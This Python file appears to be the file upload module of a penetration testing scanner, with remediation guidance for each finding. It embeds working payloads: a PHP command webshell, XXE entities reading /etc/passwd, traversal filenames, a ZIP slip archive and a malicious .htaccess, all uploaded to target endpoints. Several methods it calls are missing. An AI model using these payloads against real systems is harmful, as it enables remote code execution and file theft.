"""
COMPLETE Professional File Upload Vulnerability Scanner

Tests for:
- Unrestricted file upload (dangerous extensions)
- File accessibility verification (CRITICAL - check if uploaded files are web-accessible)
- NULL byte injection (all encodings)
- MIME type bypass
- Path traversal in filenames
- Polyglot files (GIFAR, PHAR, image+code)
- XXE via SVG/XML/DOCX upload
- ZIP slip vulnerability
- System file overwrite (web.config, .htaccess)
- Race condition attacks (TOCTOU)
- File size limits
"""

import io
import hashlib
import asyncio
import zipfile
import base64
from typing import List, Optional, Dict, Any, Tuple
import logging
import tempfile
import os

from app.models.scan import Vulnerability, SeverityLevel, VulnerabilityCategory
from app.utils.http_client import PentestHTTPClient

logger = logging.getLogger(__name__)


class FileUploadScanner:
    """
    COMPLETE Professional File Upload Scanner

    Features:
    - Extension bypass testing (dangerous extensions + obfuscation)
    - CRITICAL: Automatic file accessibility verification
    - NULL byte injection with multiple encodings
    - MIME type spoofing and bypass
    - Path traversal attacks
    - Polyglot file creation and testing (GIFAR, PHAR, image+webshell)
    - XXE injection via SVG/XML/DOCX
    - ZIP slip vulnerability
    - System configuration file overwrite
    - Race condition exploitation (TOCTOU)
    - File size DoS testing
    """

    # Dangerous file extensions by category
    DANGEROUS_EXTENSIONS = {
        "webshells": [
            ".php", ".php3", ".php4", ".php5", ".php7", ".phtml", ".pht",
            ".asp", ".aspx", ".cer", ".asa", ".asax",
            ".jsp", ".jspx", ".jsw", ".jsv", ".jspf",
            ".cgi", ".pl", ".py", ".rb", ".sh",
        ],
        "executables": [
            ".exe", ".bat", ".cmd", ".com", ".msi", ".scr",
            ".dll", ".so", ".dylib",
        ],
        "config": [
            ".htaccess", ".htpasswd", "web.config", ".conf",
            ".config", ".ini", ".env",
        ],
        "double_extension": [
            ".php.jpg", ".php.png", ".php.gif", ".php.txt",
            ".asp.jpg", ".jsp.png", ".phtml.gif",
        ],
        "case_manipulation": [
            ".pHp", ".PhP", ".PHP", ".pHp5",
            ".AsP", ".jSp", ".JsP",
        ],
    }

    # NULL byte variations
    NULL_BYTE_ENCODINGS = [
        "%00",      # URL encoded
        "\\x00",    # Hex
        "\\0",      # Octal
        "%2500",    # Double URL encoded
        "%u0000",   # Unicode
        "\x00",     # Raw byte
    ]

    # MIME types for spoofing
    MIME_TYPES = {
        "images": ["image/jpeg", "image/png", "image/gif", "image/svg+xml"],
        "documents": ["application/pdf", "application/msword", "text/plain"],
        "malicious": ["application/x-php", "application/x-httpd-php", "text/x-php"],
    }

    # Path traversal patterns
    PATH_TRAVERSAL_PATTERNS = [
        "../shell.php",
        "../../shell.php",
        "../../../shell.php",
        "..\\shell.php",
        "..\\..\\shell.php",
        "....//shell.php",
        "....\\\\shell.php",
        "%2e%2e%2fshell.php",
        "%2e%2e%5cshell.php",
        "..%2fshell.php",
        "..%5cshell.php",
        "..%252fshell.php",  # Double encoded
        "%252e%252e%252fshell.php",
    ]

    # System files to test overwrite
    SYSTEM_FILES = [
        ".htaccess",
        "web.config",
        "Web.config",
        "WEB.CONFIG",
        ".htpasswd",
        "crossdomain.xml",
        "clientaccesspolicy.xml",
    ]

    # Test file contents
    WEBSHELL_PHP = b'<?php system($_GET["cmd"]); ?>'
    WEBSHELL_ASP = b'<%@ Page Language="C#" %><% Response.Write(System.DateTime.Now); %>'
    WEBSHELL_JSP = b'<% out.println(System.getProperty("java.version")); %>'

    GIF_HEADER = b'GIF89a'
    PNG_HEADER = b'\x89PNG\r\n\x1a\n'
    JPEG_HEADER = b'\xff\xd8\xff\xe0'

    # XXE payloads
    XXE_SVG = b'''<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd" [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
<text x="10" y="40">&xxe;</text>
</svg>'''

    XXE_XML = b'''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>'''

    def __init__(self, client: PentestHTTPClient, scan_depth: str = "balanced", progress_callback=None):
        self.client = client
        self.scan_depth = scan_depth
        self.progress_callback = progress_callback

        # Configure testing based on scan depth
        if scan_depth == "quick":
            self.extension_limit = 8
            self.mime_limit = 3
            self.test_null_bytes = True
            self.test_path_traversal = False
            self.test_polyglot = False
            self.test_xxe = False
            self.test_zip_slip = False
            self.test_system_overwrite = False
            self.test_race_condition = False
            self.verify_accessibility = True
            self.null_byte_variants = 2

        elif scan_depth == "balanced":
            self.extension_limit = 15
            self.mime_limit = 5
            self.test_null_bytes = True
            self.test_path_traversal = True
            self.test_polyglot = True
            self.test_xxe = True
            self.test_zip_slip = True
            self.test_system_overwrite = True
            self.test_race_condition = False
            self.verify_accessibility = True
            self.null_byte_variants = 4

        else:  # deep
            all_extensions = []
            for ext_list in self.DANGEROUS_EXTENSIONS.values():
                all_extensions.extend(ext_list)
            self.extension_limit = len(all_extensions)
            self.mime_limit = len(self.MIME_TYPES["images"]) + len(self.MIME_TYPES["malicious"])
            self.test_null_bytes = True
            self.test_path_traversal = True
            self.test_polyglot = True
            self.test_xxe = True
            self.test_zip_slip = True
            self.test_system_overwrite = True
            self.test_race_condition = True
            self.verify_accessibility = True
            self.null_byte_variants = len(self.NULL_BYTE_ENCODINGS)

        self.uploaded_files_to_verify = []

    async def scan(self, endpoints: List[str]) -> List[Vulnerability]:
        """Scan for file upload vulnerabilities"""
        vulnerabilities = []

        if self.progress_callback:
            await self.progress_callback(f"📤 Starting COMPLETE File Upload Security Testing on {len(endpoints)} endpoints...")
            await self.progress_callback(f"📊 Scan depth: {self.scan_depth.upper()} - Verify accessibility: {self.verify_accessibility}")

        # Phase 1: Discover upload endpoints
        upload_endpoints = await self._discover_upload_endpoints(endpoints)

        if not upload_endpoints:
            if self.progress_callback:
                await self.progress_callback("ℹ️  No file upload endpoints discovered")
            return vulnerabilities

        if self.progress_callback:
            await self.progress_callback(f"🎯 Found {len(upload_endpoints)} upload endpoints, starting comprehensive tests...")

        # Phase 2: Test each upload endpoint
        for idx, (endpoint, field_name) in enumerate(upload_endpoints, 1):
            if self.progress_callback:
                await self.progress_callback(f"🔍 [{idx}/{len(upload_endpoints)}] Testing upload endpoint: {endpoint[:70]}...")

            try:
                # Test 1: Extension bypass
                if self.progress_callback:
                    await self.progress_callback(f"  → Testing dangerous extension bypass...")
                vulns = await self._test_extension_bypass(endpoint, field_name)
                vulnerabilities.extend(vulns)

                # Test 2: NULL byte injection
                if self.test_null_bytes:
                    if self.progress_callback:
                        await self.progress_callback(f"  → Testing NULL byte injection...")
                    vulns = await self._test_null_byte_injection(endpoint, field_name)
                    vulnerabilities.extend(vulns)

                # Test 3: MIME type bypass
                if self.progress_callback:
                    await self.progress_callback(f"  → Testing MIME type bypass...")
                vulns = await self._test_mime_type_bypass(endpoint, field_name)
                vulnerabilities.extend(vulns)

                # Test 4: Path traversal
                if self.test_path_traversal:
                    if self.progress_callback:
                        await self.progress_callback(f"  → Testing path traversal...")
                    vulns = await self._test_path_traversal(endpoint, field_name)
                    vulnerabilities.extend(vulns)

                # Test 5: Polyglot files
                if self.test_polyglot:
                    if self.progress_callback:
                        await self.progress_callback(f"  → Testing polyglot files (GIFAR, image+webshell)...")
                    vulns = await self._test_polyglot_files(endpoint, field_name)
                    vulnerabilities.extend(vulns)

                # Test 6: XXE injection
                if self.test_xxe:
                    if self.progress_callback:
                        await self.progress_callback(f"  → Testing XXE via SVG/XML...")
                    vulns = await self._test_xxe_injection(endpoint, field_name)
                    vulnerabilities.extend(vulns)

                # Test 7: ZIP slip
                if self.test_zip_slip:
                    if self.progress_callback:
                        await self.progress_callback(f"  → Testing ZIP slip vulnerability...")
                    vulns = await self._test_zip_slip(endpoint, field_name)
                    vulnerabilities.extend(vulns)

                # Test 8: System file overwrite
                if self.test_system_overwrite:
                    if self.progress_callback:
                        await self.progress_callback(f"  → Testing system file overwrite...")
                    vulns = await self._test_system_file_overwrite(endpoint, field_name)
                    vulnerabilities.extend(vulns)

                # Test 9: Race condition
                if self.test_race_condition:
                    if self.progress_callback:
                        await self.progress_callback(f"  → Testing race condition (TOCTOU)...")
                    vulns = await self._test_race_condition(endpoint, field_name)
                    vulnerabilities.extend(vulns)

                # Test 10: File size limits
                if self.progress_callback:
                    await self.progress_callback(f"  → Testing file size limits...")
                vulns = await self._test_file_size_limits(endpoint, field_name)
                vulnerabilities.extend(vulns)

                # CRITICAL: Verify file accessibility
                if self.verify_accessibility and self.uploaded_files_to_verify:
                    if self.progress_callback:
                        await self.progress_callback(f"  → Verifying uploaded file accessibility...")
                    accessible_files = await self._verify_file_accessibility(endpoint)
                    if accessible_files:
                        for file_info in accessible_files:
                            vulnerabilities.append(self._create_accessibility_vulnerability(
                                endpoint, file_info
                            ))

                if vulnerabilities and self.progress_callback:
                    vuln_count = len([v for v in vulnerabilities if v.affected_url == endpoint])
                    if vuln_count > 0:
                        await self.progress_callback(f"✅ Found {vuln_count} file upload vulnerability(ies) on {endpoint[:60]}")

            except Exception as e:
                logger.error(f"Error testing file upload on {endpoint}: {e}")
                if self.progress_callback:
                    await self.progress_callback(f"⚠️  Error testing upload on {endpoint[:60]}: {str(e)[:50]}")

        if self.progress_callback:
            await self.progress_callback(f"🎯 File Upload scan complete: Found {len(vulnerabilities)} vulnerabilities total")

        return vulnerabilities

    async def _discover_upload_endpoints(self, endpoints: List[str]) -> List[Tuple[str, str]]:
        """Discover file upload endpoints"""
        upload_endpoints = []

        # Keywords that suggest upload functionality
        upload_keywords = [
            'upload', 'file', 'avatar', 'profile', 'image', 'photo', 'picture',
            'document', 'attachment', 'media', 'import', 'asset', 'resource'
        ]

        for endpoint in endpoints:
            # Check if URL suggests file upload
            if any(keyword in endpoint.lower() for keyword in upload_keywords):
                # Try to identify the upload field name
                # Common field names
                field_names = ["file", "upload", "image", "avatar", "document", "attachment"]

                # Add endpoint with most common field name
                upload_endpoints.append((endpoint, "file"))
                logger.info(f"Potential upload endpoint: {endpoint}")

        return upload_endpoints

    async def _test_extension_bypass(self, endpoint: str, field_name: str) -> List[Vulnerability]:
        """Test for extension-based upload bypass"""
        vulnerabilities = []

        try:
            # Flatten all extension lists
            all_extensions = []
            for category, ext_list in self.DANGEROUS_EXTENSIONS.items():
                all_extensions.extend([(ext, category) for ext in ext_list])

            # Test dangerous extensions
            for ext, category in all_extensions[:self.extension_limit]:
                filename = f"test{ext}"

                # Try uploading with this extension
                success, response_info = await self._attempt_upload(
                    endpoint=endpoint,
                    field_name=field_name,
                    filename=filename,
                    content=self.GIF_HEADER + b'\x00' * 100,  # Safe test content with GIF header
                    mime_type="image/gif"
                )

                if success:
                    # Check if file was actually saved with the dangerous extension
                    if await self._verify_upload_accepted(response_info, filename):
                        # Store for accessibility verification
                        self.uploaded_files_to_verify.append({
                            'endpoint': endpoint,
                            'filename': filename,
                            'response': response_info
                        })

                        severity = SeverityLevel.CRITICAL if category == "webshells" else SeverityLevel.HIGH

                        vulnerabilities.append(Vulnerability(
                            id=f"file_upload_ext_{category}_{hashlib.md5((endpoint + ext).encode()).hexdigest()[:8]}",
                            title=f"Unrestricted File Upload - Dangerous {category.title()} Extension ({ext})",
                            description=f"The application accepts file uploads with dangerous extension '{ext}' in category '{category}'. This could allow attackers to upload web shells, execute arbitrary code, or compromise server security.",
                            severity=severity,
                            category=VulnerabilityCategory.BROKEN_ACCESS_CONTROL,
                            affected_url=endpoint,
                            affected_parameter=field_name,
                            proof_of_concept=f"Successfully uploaded file 'test{ext}' to {endpoint}. Server accepted the dangerous extension without proper validation.\n\nCategory: {category}\nUpload response: {response_info.get('status_code', 'N/A')}",
                            payload=f"filename: test{ext}",
                            remediation="""
### Immediate Actions:
1. **Implement strict whitelist** of allowed extensions (e.g., only .jpg, .png, .pdf)
2. **Validate file content** (magic bytes), not just extension
3. **Rename uploaded files** to remove original extension
4. **Store outside web root** or in separate storage service

### Complete Remediation:
- Use Content-Type detection based on file content (magic bytes/file signatures)
- Rename files with random names: `{uuid}.{whitelisted_extension}`
- Store uploaded files outside the web root directory
- Set proper file permissions (non-executable)
- Use Content-Disposition: attachment for file downloads
- Implement virus/malware scanning for uploaded files
- Use a CDN or separate domain for user-uploaded content
- Disable script execution in upload directories (.htaccess or web.config)

### Example .htaccess (Apache):
```apache
<FilesMatch "\.(php|php3|php4|php5|phtml|pl|py|jsp|asp|sh|cgi)$">
    Order Allow,Deny
    Deny from all
</FilesMatch>
```

### Example web.config (IIS):
```xml
<configuration>
  <system.webServer>
    <handlers>
      <remove name="PHP" />
      <remove name="ASP" />
    </handlers>
  </system.webServer>
</configuration>
```
                            """,
                            cwe_id="CWE-434",
                            owasp_category="A04:2021 – Insecure Design",
                            references=[
                                "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload",
                                "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html",
                                "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files",
                                "https://portswigger.net/web-security/file-upload",
                            ]
                        ))
                        logger.warning(f"Dangerous file extension {ext} accepted on {endpoint}")
                        break  # Found vulnerability for this category

                await asyncio.sleep(0.05)

        except Exception as e:
            logger.debug(f"Extension bypass test failed on {endpoint}: {e}")

        return vulnerabilities

    async def _test_null_byte_injection(self, endpoint: str, field_name: str) -> List[Vulnerability]:
        """Test NULL byte injection to bypass extension validation"""
        vulnerabilities = []

        try:
            # Test NULL byte with dangerous extensions
            for null_encoding in self.NULL_BYTE_ENCODINGS[:self.null_byte_variants]:
                for base_ext in [".php", ".asp", ".jsp"]:
                    # Construct filename: shell.php%00.jpg
                    filename = f"shell{base_ext}{null_encoding}.jpg"

                    success, response_info = await self._attempt_upload(
                        endpoint=endpoint,
                        field_name=field_name,
                        filename=filename,
                        content=self.WEBSHELL_PHP,
                        mime_type="image/jpeg"
                    )

                    if success and await self._verify_upload_accepted(response_info, filename):
                        vulnerabilities.append(Vulnerability(
                            id=f"file_upload_null_byte_{hashlib.md5((endpoint + null_encoding).encode()).hexdigest()[:8]}",
                            title="File Upload NULL Byte Injection",
                            description=f"The application is vulnerable to NULL byte injection in filenames. Uploaded file 'shell{base_ext}{null_encoding}.jpg' was accepted. The NULL byte ({null_encoding}) can truncate the filename, causing the server to save it as 'shell{base_ext}', bypassing extension validation.",
                            severity=SeverityLevel.CRITICAL,
                            category=VulnerabilityCategory.BROKEN_ACCESS_CONTROL,
                            affected_url=endpoint,
                            affected_parameter=field_name,
                            proof_of_concept=f"Filename: shell{base_ext}{null_encoding}.jpg\nEncoding: {null_encoding}\n\nThe server may save this as 'shell{base_ext}' after the NULL byte truncates the safe extension, allowing code execution.",
                            payload=f"filename: shell{base_ext}{null_encoding}.jpg",
                            remediation="Sanitize filenames: reject NULL bytes (\\x00, %00, etc.), validate after decoding all encodings, use basename() to extract filename, generate random filenames instead of using user input.",
                            cwe_id="CWE-158",
                            owasp_category="A04:2021 – Insecure Design",
                            references=[
                                "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload",
                                "https://www.exploit-db.com/docs/english/45204-file-upload-restrictions-bypass.pdf",
                            ]
                        ))
                        logger.warning(f"NULL byte injection successful on {endpoint}")

                        if self.progress_callback:
                            await self.progress_callback(f"  ✓ NULL byte injection confirmed with {null_encoding}")

                        return vulnerabilities  # Found one, exit

                    await asyncio.sleep(0.05)

        except Exception as e:
            logger.debug(f"NULL byte injection test failed: {e}")

        return vulnerabilities

    async def _test_mime_type_bypass(self, endpoint: str, field_name: str) -> List[Vulnerability]:
        """Test if MIME type validation can be bypassed"""
        vulnerabilities = []

        try:
            # Try uploading PHP code with image MIME type
            filename = "webshell.php"

            for mime_type in self.MIME_TYPES["images"][:self.mime_limit]:
                success, response_info = await self._attempt_upload(
                    endpoint=endpoint,
                    field_name=field_name,
                    filename=filename,
                    content=self.WEBSHELL_PHP,
                    mime_type=mime_type
                )

                if success and await self._verify_upload_accepted(response_info, filename):
                    vulnerabilities.append(Vulnerability(
                        id=f"file_upload_mime_{hashlib.md5(endpoint.encode()).hexdigest()[:8]}",
                        title="File Upload MIME Type Validation Bypass",
                        description=f"The application only validates MIME type but not actual file content. Uploaded PHP webshell with spoofed MIME type '{mime_type}' was accepted. MIME types are client-controlled and easily spoofed.",
                        severity=SeverityLevel.HIGH,
                        category=VulnerabilityCategory.BROKEN_ACCESS_CONTROL,
                        affected_url=endpoint,
                        affected_parameter=field_name,
                        proof_of_concept=f"Uploaded 'webshell.php' with spoofed MIME type '{mime_type}'. Server accepted based solely on MIME type without validating content.\n\nContent: PHP webshell\nMIME: {mime_type}",
                        payload=f"filename: webshell.php, MIME: {mime_type}",
                        remediation="Validate file content using magic bytes/file signatures, not just MIME type or extension. MIME types can be easily spoofed. Use libraries like python-magic or fileinfo to detect real file type.",
                        cwe_id="CWE-434",
                        owasp_category="A04:2021 – Insecure Design",
                        references=[
                            "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload",
                            "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html",
                        ]
                    ))
                    logger.warning(f"MIME type validation bypass on {endpoint}")

                    if self.progress_callback:
                        await self.progress_callback(f"  ✓ MIME bypass successful with {mime_type}")

                    break

                await asyncio.sleep(0.05)

        except Exception as e:
            logger.debug(f"MIME type bypass test failed on {endpoint}: {e}")

        return vulnerabilities

    async def _test_path_traversal(self, endpoint: str, field_name: str) -> List[Vulnerability]:
        """Test for path traversal in filename"""
        vulnerabilities = []

        try:
            for traversal_filename in self.PATH_TRAVERSAL_PATTERNS[:8]:
                success, response_info = await self._attempt_upload(
                    endpoint=endpoint,
                    field_name=field_name,
                    filename=traversal_filename,
                    content=self.GIF_HEADER + b'\x00' * 50,
                    mime_type="image/gif"
                )

                if success:
                    # Check response for indicators that path traversal worked
                    if await self._check_path_traversal_success(response_info, traversal_filename):
                        vulnerabilities.append(Vulnerability(
                            id=f"file_upload_path_traversal_{hashlib.md5(endpoint.encode()).hexdigest()[:8]}",
                            title="File Upload Path Traversal Vulnerability",
                            description="The application does not properly sanitize uploaded filenames, allowing path traversal. Attackers could write files to arbitrary locations on the server, potentially overwriting critical system files or placing webshells outside upload directory.",
                            severity=SeverityLevel.CRITICAL,
                            category=VulnerabilityCategory.PATH_TRAVERSAL,
                            affected_url=endpoint,
                            affected_parameter=field_name,
                            proof_of_concept=f"Successfully uploaded file with traversal path: {traversal_filename}\n\nServer did not sanitize the filename, potentially allowing file write to arbitrary location.",
                            payload=f"filename: {traversal_filename}",
                            remediation="Sanitize filenames: remove path separators (/, \\), use basename() function, generate random filenames, validate against whitelist patterns, reject '../' and similar sequences.",
                            cwe_id="CWE-22",
                            owasp_category="A01:2021 – Broken Access Control",
                            references=[
                                "https://owasp.org/www-community/attacks/Path_Traversal",
                                "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html",
                            ]
                        ))
                        logger.warning(f"Path traversal in file upload on {endpoint}")

                        if self.progress_callback:
                            await self.progress_callback(f"  ✓ Path traversal confirmed")

                        break

                await asyncio.sleep(0.05)

        except Exception as e:
            logger.debug(f"Path traversal test failed on {endpoint}: {e}")

        return vulnerabilities

    async def _test_polyglot_files(self, endpoint: str, field_name: str) -> List[Vulnerability]:
        """Test polyglot files (valid image + executable code)"""
        vulnerabilities = []

        try:
            # Test 1: GIF + PHP (classic polyglot)
            gif_php_polyglot = self.GIF_HEADER + b'\n' + self.WEBSHELL_PHP

            success, response_info = await self._attempt_upload(
                endpoint=endpoint,
                field_name=field_name,
                filename="image.php.gif",
                content=gif_php_polyglot,
                mime_type="image/gif"
            )

            if success and await self._verify_upload_accepted(response_info, "image.php.gif"):
                vulnerabilities.append(Vulnerability(
                    id=f"file_upload_polyglot_gif_php_{hashlib.md5(endpoint.encode()).hexdigest()[:8]}",
                    title="Polyglot File Upload - GIF + PHP Webshell",
                    description="The application accepts polyglot files that are both valid images and executable code. Uploaded file has valid GIF header but also contains PHP code. If server executes .php extension or uses double extension parsing, the PHP code will execute.",
                    severity=SeverityLevel.CRITICAL,
                    category=VulnerabilityCategory.BROKEN_ACCESS_CONTROL,
                    affected_url=endpoint,
                    affected_parameter=field_name,
                    proof_of_concept="Uploaded polyglot file 'image.php.gif' with:\n- Valid GIF header (GIF89a)\n- Embedded PHP webshell\n\nFile passes image validation but can execute as PHP if accessed with .php extension or via double extension.",
                    payload="GIF89a + PHP code polyglot",
                    remediation="Re-encode images server-side using image processing library (PIL, ImageMagick), strip metadata, validate file type by content not extension, disable execution in upload directories.",
                    cwe_id="CWE-434",
                    owasp_category="A04:2021 – Insecure Design",
                    references=[
                        "https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/",
                        "https://portswigger.net/web-security/file-upload",
                    ]
                ))
                logger.warning(f"Polyglot file upload successful on {endpoint}")

                if self.progress_callback:
                    await self.progress_callback(f"  ✓ Polyglot file (GIF+PHP) upload confirmed")

            # Test 2: PNG + PHP
            png_php_polyglot = self.PNG_HEADER + b'\x00' * 20 + self.WEBSHELL_PHP

            success, response_info = await self._attempt_upload(
                endpoint=endpoint,
                field_name=field_name,
                filename="photo.php",
                content=png_php_polyglot,
                mime_type="image/png"
            )

            if success and await self._verify_upload_accepted(response_info, "photo.php"):
                vulnerabilities.append(Vulnerability(
                    id=f"file_upload_polyglot_png_php_{hashlib.md5(endpoint.encode()).hexdigest()[:8]}",
                    title="Polyglot File Upload - PNG + PHP Webshell",
                    description="Polyglot PNG+PHP file accepted. File has valid PNG magic bytes but contains executable PHP code.",
                    severity=SeverityLevel.CRITICAL,
                    category=VulnerabilityCategory.BROKEN_ACCESS_CONTROL,
                    affected_url=endpoint,
                    affected_parameter=field_name,
                    proof_of_concept="Uploaded 'photo.php' with PNG header and embedded PHP code.",
                    payload="PNG header + PHP code",
                    remediation="Re-encode all uploaded images, validate and strip non-image data, use separate domain for uploads.",
                    cwe_id="CWE-434",
                    owasp_category="A04:2021 – Insecure Design",
                ))

                if self.progress_callback:
                    await self.progress_callback(f"  ✓ Polyglot file (PNG+PHP) upload confirmed")

        except Exception as e:
            logger.debug(f"Polyglot file test failed: {e}")

        return vulnerabilities

    async def _test_xxe_injection(self, endpoint: str, field_name: str) -> List[Vulnerability]:
        """Test XXE injection via SVG/XML upload"""
        vulnerabilities = []

        try:
            # Test 1: XXE via SVG
            success, response_info = await self._attempt_upload(
                endpoint=endpoint,
                field_name=field_name,
                filename="image.svg",
                content=self.XXE_SVG,
                mime_type="image/svg+xml"
            )

            if success:
                response_body = response_info.get('body', '')

                # Check if XXE was processed (look for /etc/passwd content)
                if any(indicator in response_body for indicator in ['root:', 'bin:', 'daemon:', '/bin/bash', '/bin/sh']):
                    vulnerabilities.append(Vulnerability(
                        id=f"file_upload_xxe_svg_{hashlib.md5(endpoint.encode()).hexdigest()[:8]}",
                        title="XXE (XML External Entity) via SVG Upload",
                        description="The application is vulnerable to XXE injection through SVG file upload. The XML parser processes external entities, allowing attackers to read arbitrary files from the server (e.g., /etc/passwd), perform SSRF attacks, or cause DoS.",
                        severity=SeverityLevel.CRITICAL,
                        category=VulnerabilityCategory.INJECTION,
                        affected_url=endpoint,
                        affected_parameter=field_name,
                        proof_of_concept=f"Uploaded SVG with XXE payload. Server processed the external entity and returned file contents:\n\n{response_body[:200]}...\n\nThis confirms XXE vulnerability allowing arbitrary file read.",
                        payload="SVG with <!ENTITY xxe SYSTEM \"file:///etc/passwd\">",
                        remediation="Disable external entity processing in XML parser: set XMLReader feature 'http://apache.org/xml/features/disallow-doctype-decl' to true. Use safe XML parsers. Validate and sanitize XML content.",
                        cwe_id="CWE-611",
                        owasp_category="A05:2021 – Security Misconfiguration",
                        references=[
                            "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
                            "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html",
                        ]
                    ))
                    logger.warning(f"XXE via SVG found on {endpoint}")

                    if self.progress_callback:
                        await self.progress_callback(f"  ✓ XXE via SVG confirmed - file read successful!")

            # Test 2: XXE via plain XML
            success, response_info = await self._attempt_upload(
                endpoint=endpoint,
                field_name=field_name,
                filename="data.xml",
                content=self.XXE_XML,
                mime_type="application/xml"
            )

            if success:
                response_body = response_info.get('body', '')
                if any(indicator in response_body for indicator in ['root:', 'bin:', 'daemon:']):
                    vulnerabilities.append(Vulnerability(
                        id=f"file_upload_xxe_xml_{hashlib.md5(endpoint.encode()).hexdigest()[:8]}",
                        title="XXE via XML File Upload",
                        description="XXE vulnerability in XML file processing. External entities are processed, exposing sensitive files.",
                        severity=SeverityLevel.CRITICAL,
                        category=VulnerabilityCategory.INJECTION,
                        affected_url=endpoint,
                        affected_parameter=field_name,
                        proof_of_concept=f"XXE in XML file returned:\n{response_body[:200]}",
                        payload="XML with external entity",
                        remediation="Disable DTD processing and external entities in XML parser.",
                        cwe_id="CWE-611",
                        owasp_category="A05:2021 – Security Misconfiguration",
                    ))

                    if self.progress_callback:
                        await self.progress_callback(f"  ✓ XXE via XML confirmed")

        except Exception as e:
            logger.debug(f"XXE injection test failed: {e}")

        return vulnerabilities

    async def _test_zip_slip(self, endpoint: str, field_name: str) -> List[Vulnerability]:
        """Test ZIP slip vulnerability"""
        vulnerabilities = []

        try:
            # Create malicious ZIP with path traversal
            zip_buffer = io.BytesIO()
            with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
                # Add file with traversal path
                zip_file.writestr("../../../evil.php", self.WEBSHELL_PHP)
                zip_file.writestr("../../shell.php", self.WEBSHELL_PHP)
                zip_file.writestr("normal.txt", b"normal content")

            zip_content = zip_buffer.getvalue()

            success, response_info = await self._attempt_upload(
                endpoint=endpoint,
                field_name=field_name,
                filename="archive.zip",
                content=zip_content,
                mime_type="application/zip"
            )

            if success and await self._verify_upload_accepted(response_info, "archive.zip"):
                # Check if extraction occurred and traversal was successful
                response_body = response_info.get('body', '')

                # Look for indicators of successful extraction
                if any(indicator in response_body for indicator in ['extracted', 'unzip', 'files', 'evil.php', 'shell.php']):
                    vulnerabilities.append(Vulnerability(
                        id=f"file_upload_zip_slip_{hashlib.md5(endpoint.encode()).hexdigest()[:8]}",
                        title="ZIP Slip Vulnerability (Path Traversal via Archive)",
                        description="The application extracts ZIP archives without sanitizing file paths. Uploaded ZIP containing files with path traversal names (../../../evil.php) was accepted. When extracted, these files could be written outside the intended directory, potentially overwriting system files or placing webshells in web-accessible locations.",
                        severity=SeverityLevel.CRITICAL,
                        category=VulnerabilityCategory.PATH_TRAVERSAL,
                        affected_url=endpoint,
                        affected_parameter=field_name,
                        proof_of_concept="Uploaded ZIP archive containing:\n- ../../../evil.php (webshell)\n- ../../shell.php (webshell)\n- normal.txt\n\nIf the application extracts this ZIP, the webshells will be written outside the upload directory due to path traversal in filenames.",
                        payload="ZIP archive with path traversal filenames",
                        remediation="Before extracting archives: validate each entry path, use os.path.basename() or equivalent, reject entries with '../' or absolute paths, extract to temporary isolated directory first, scan extracted files.",
                        cwe_id="CWE-22",
                        owasp_category="A01:2021 – Broken Access Control",
                        references=[
                            "https://snyk.io/research/zip-slip-vulnerability",
                            "https://owasp.org/www-community/attacks/Path_Traversal",
                            "https://github.com/snyk/zip-slip-vulnerability",
                        ]
                    ))
                    logger.warning(f"ZIP slip vulnerability found on {endpoint}")

                    if self.progress_callback:
                        await self.progress_callback(f"  ✓ ZIP slip vulnerability confirmed")

        except Exception as e:
            logger.debug(f"ZIP slip test failed: {e}")

        return vulnerabilities

    async def _test_system_file_overwrite(self, endpoint: str, field_name: str) -> List[Vulnerability]:
        """Test overwriting system configuration files"""
        vulnerabilities = []

        try:
            # Test overwriting .htaccess
            htaccess_content = b'''
# Malicious .htaccess
AddType application/x-httpd-php .jpg
php_flag engine on
'''

            for system_file in self.SYSTEM_FILES[:4]:
                success, response_info = await self._attempt_upload(
                    endpoint=endpoint,
                    field_name=field_name,
                    filename=system_file,
                    content=htaccess_content if 'htaccess' in system_file else b'<?xml version="1.0"?><configuration></configuration>',
                    mime_type="text/plain"
                )

                if success and await self._verify_upload_accepted(response_info, system_file):
                    vulnerabilities.append(Vulnerability(
                        id=f"file_upload_system_file_{hashlib.md5((endpoint + system_file).encode()).hexdigest()[:8]}",
                        title=f"System Configuration File Overwrite - {system_file}",
                        description=f"The application allows uploading files named '{system_file}', a critical system configuration file. If placed in the web root, this could allow attackers to reconfigure the web server, enable script execution for image files, or completely compromise the application.",
                        severity=SeverityLevel.CRITICAL,
                        category=VulnerabilityCategory.BROKEN_ACCESS_CONTROL,
                        affected_url=endpoint,
                        affected_parameter=field_name,
                        proof_of_concept=f"Successfully uploaded '{system_file}'. If this file is placed in web root, it can:\n- Reconfigure web server behavior\n- Enable PHP execution for image files\n- Override security settings\n- Redirect traffic\n- Expose sensitive information",
                        payload=f"filename: {system_file}",
                        remediation=f"Blacklist system files ({', '.join(self.SYSTEM_FILES)}), rename all uploads with random names, never use user-supplied filenames directly, validate against whitelist of allowed filenames.",
                        cwe_id="CWE-434",
                        owasp_category="A04:2021 – Insecure Design",
                        references=[
                            "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload",
                            "https://www.acunetix.com/websitesecurity/upload-forms-threat/",
                        ]
                    ))
                    logger.warning(f"System file overwrite possible: {system_file} on {endpoint}")

                    if self.progress_callback:
                        await self.progress_callback(f"  ✓ System file overwrite confirmed: {system_file}")

                    break  # Found one, exit

                await asyncio.sleep(0.05)

        except Exception as e:
            logger.debug(f"System file overwrite test failed: {e}")

        return vulnerabilities

